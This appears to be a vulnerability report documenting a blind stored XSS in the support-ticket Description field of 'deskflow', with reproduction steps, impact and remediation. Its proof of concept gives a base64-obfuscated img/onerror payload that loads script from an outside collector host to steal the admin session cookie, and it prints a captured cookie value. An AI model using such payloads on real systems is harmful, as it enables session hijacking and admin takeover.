## Title
Blind XSS in Support Request Description Parameter - Deskflow

## Description
**Affected URL:** https://deskflow.pwnedbox.site/request.php (triggers on https://deskflow.pwnedbox.site/admin/view.php?id=2)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the customer support request submission form on `deskflow.pwnedbox.site`. Input submitted in the **Description** field is stored without HTML encoding and renders directly in the DOM when an administrator opens the ticket in the backend (`/admin/view.php`). Because the script executes inside an authenticated admin session and `PHPSESSID` lacks the `HttpOnly` flag, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://deskflow.pwnedbox.site/request.php`, fill in the required fields, paste the Blind XSS payload into the **Description** box, and click **Send request**.
2. Log in to the admin panel and open the submitted ticket (`/admin/view.php?id=2`).
3. Observe the payload execute immediately in the ticket body, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://deskflow.pwnedbox.site/request.php` (`Description` field)

**Trigger Endpoint:** `https://deskflow.pwnedbox.site/admin/view.php?id=2`

**Payload:**
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
```

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://deskflow.pwnedbox.site/admin/view.php?id=2`
- **Exfiltrated Session Cookie:** `PHPSESSID=c1efe47fcc022177064ea7d541e00f15`

**Visual Evidence:**
- Support request submission form on `deskflow.pwnedbox.site/request.php` with the payload entered in the **Description** field.
  <img width="1766" height="862" alt="image" src="https://github.com/user-attachments/assets/67299ae5-4119-4b21-99ab-717aa5cb123f" /><br><br>

- Admin ticket view (`/admin/view.php?id=2`) displaying the rendered broken image icon in the message area where the script fired, alongside Browser Storage showing `PHPSESSID` with `HttpOnly` set to `false`.
  <img width="1702" height="757" alt="image" src="https://github.com/user-attachments/assets/6f5bb60f-6403-43ed-a80b-463a91ccdd6d" /><br><br>

- Blind XSS collector report confirming execution on `/admin/view.php?id=2` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1687" height="997" alt="image" src="https://github.com/user-attachments/assets/aabc64bd-341e-4666-93a3-2e87204168c4" /><br>

  

## Impact
Because the payload executes automatically when an administrator reviews incoming support requests:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, update, or manage all submitted customer support requests and knowledge base content.
- **Persistent Compromise:** Attackers can use the hijacked admin session to modify ticket statuses, reply to customers as staff, or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied ticket fields before rendering them in `/admin/view.php` and the admin inbox.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block inline event handlers like `onerror` and restrict external requests.
